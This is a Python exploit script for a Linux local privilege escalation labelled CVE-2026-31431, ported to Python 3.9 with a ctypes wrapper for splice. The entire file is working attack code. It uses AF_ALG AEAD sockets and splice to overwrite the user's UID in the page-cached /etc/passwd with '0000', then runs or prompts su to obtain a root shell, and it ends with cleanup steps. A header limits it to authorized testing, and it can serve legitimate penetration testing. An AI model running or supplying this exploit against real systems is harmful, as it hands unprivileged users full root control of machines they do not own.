#!/usr/bin/env python3
# CVE-2026-31431 ("Copy Fail") local privilege escalation.
#
# AUTHORIZED TESTING ONLY. Use only on hosts you own or are explicitly
# engaged to assess.
#
# Python 3.9-compatible port — os.splice() replaced with ctypes libc splice(2).

import ctypes
import ctypes.util
import errno
import os
import pwd
import socket
import struct
import sys

# ---------------------------------------------------------------------------
# ctypes splice(2) wrapper (replaces os.splice which needs Python 3.12)
# ---------------------------------------------------------------------------

_libc_name = ctypes.util.find_library("c") or "libc.so.6"
_libc = ctypes.CDLL(_libc_name, use_errno=True)

_libc.splice.restype = ctypes.c_ssize_t
_libc.splice.argtypes = [
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_int64),
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_int64),
    ctypes.c_size_t,
    ctypes.c_uint,
]


def _splice(fd_in, fd_out, length, offset_src=None):
    if offset_src is None:
        p_off_in = None
    else:
        _off = ctypes.c_int64(offset_src)
        p_off_in = ctypes.byref(_off)

    n = _libc.splice(fd_in, p_off_in, fd_out, None, length, 0)
    if n < 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return n


# ---------------------------------------------------------------------------
# AF_ALG constants
# ---------------------------------------------------------------------------

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_OP_DECRYPT = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1

ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
PASSWD = "/etc/passwd"


def authenc_keyblob(authkey, enckey):
    rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
    keyparam = struct.pack(">I", len(enckey))
    return rtattr + keyparam + authkey + enckey


def write4(target_path, file_offset, four_bytes):
    if len(four_bytes) != 4:
        raise ValueError("write4 takes exactly 4 bytes")

    fd_target = os.open(target_path, os.O_RDONLY)
    try:
        os.read(fd_target, 4096)

        master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        master.bind(("aead", ALG_NAME))
        master.setsockopt(SOL_ALG, ALG_SET_KEY,
                          authenc_keyblob(b"\x00" * 32, b"\x00" * 16))
        op, _ = master.accept()
        try:
            aad = b"\x00" * 4 + four_bytes
            cmsg = [
                (SOL_ALG, ALG_SET_OP, struct.pack("I", ALG_OP_DECRYPT)),
                (SOL_ALG, ALG_SET_IV, struct.pack("I", 16) + b"\x00" * 16),
                (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", 8)),
            ]
            op.sendmsg([aad], cmsg, socket.MSG_MORE)

            pr, pw = os.pipe()
            try:
                n = _splice(fd_target, pw, 32, offset_src=file_offset)
                if n != 32:
                    raise RuntimeError(f"splice file->pipe short: {n}")
                n = _splice(pr, op.fileno(), n)
                if n != 32:
                    raise RuntimeError(f"splice pipe->op short: {n}")
            finally:
                os.close(pr)
                os.close(pw)

            try:
                op.recv(64)
            except OSError as e:
                if e.errno not in (errno.EBADMSG, errno.EINVAL):
                    raise
        finally:
            op.close()
            master.close()
    finally:
        os.close(fd_target)


def find_uid_field(path, username):
    with open(path, "rb") as f:
        data = f.read()

    needle = username.encode() + b":"
    line_start = 0
    while line_start < len(data):
        if data.startswith(needle, line_start):
            j = line_start + len(needle)
            colon1 = data.index(b":", j)
            uid_off = colon1 + 1
            uid_end = data.index(b":", uid_off)
            return uid_off, data[uid_off:uid_end].decode("ascii")
        nl = data.find(b"\n", line_start)
        if nl < 0:
            break
        line_start = nl + 1
    raise LookupError(f"user {username!r} not found in {path}")


def main():
    user = os.environ.get("USER") or pwd.getpwuid(os.getuid()).pw_name
    do_exec = "--shell" in sys.argv

    print(f"[*] CVE-2026-31431 LPE  user={user}  uid={os.getuid()}")
    print(f"[*] Python {sys.version.split()[0]}  (ctypes splice wrapper)")

    try:
        uid_off, uid_str = find_uid_field(PASSWD, user)
    except LookupError as e:
        print(f"[!] {e}")
        return 1
    print(f"[*] {PASSWD}: {user} UID field at offset {uid_off} = {uid_str!r}")

    if len(uid_str) != 4:
        print(f"[!] UID '{uid_str}' is {len(uid_str)} chars; this technique "
              f"needs a 4-digit UID (e.g. 1000-9999).")
        return 1

    print(f"[*] Patching {uid_str!r} -> '0000' in page cache...")
    write4(PASSWD, uid_off, b"0000")

    with open(PASSWD, "rb") as f:
        f.seek(uid_off)
        landed = f.read(4)
    print(f"[*] Page cache now reads {landed!r} at offset {uid_off}")
    if landed != b"0000":
        print("[!] Patch did not land. Aborting.")
        return 1

    try:
        pwent = pwd.getpwnam(user)
        print(f"[*] getpwnam({user!r}).pw_uid = {pwent.pw_uid}")
        if pwent.pw_uid != 0:
            print("[!] getpwnam still sees the real UID (NSS cache?).")
    except KeyError:
        pass

    print()
    print(f"[+] /etc/passwd page cache now lists {user} as UID 0.")
    print(f"[+] Run:   su {user}")
    print(f"[+] Enter your own password. su will setuid(0) and drop a root shell.")
    print()
    print(f"[i] Cleanup: echo 3 > /proc/sys/vm/drop_caches (from root shell)")

    if do_exec:
        print(f"[+] Executing `su {user}` now...")
        os.execvp("su", ["su", user])

    if not do_exec:
        fd = os.open(PASSWD, os.O_RDONLY)
        try:
            os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
        finally:
            os.close(fd)
        print("[i] Page cache evicted. UID->name lookups restored.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
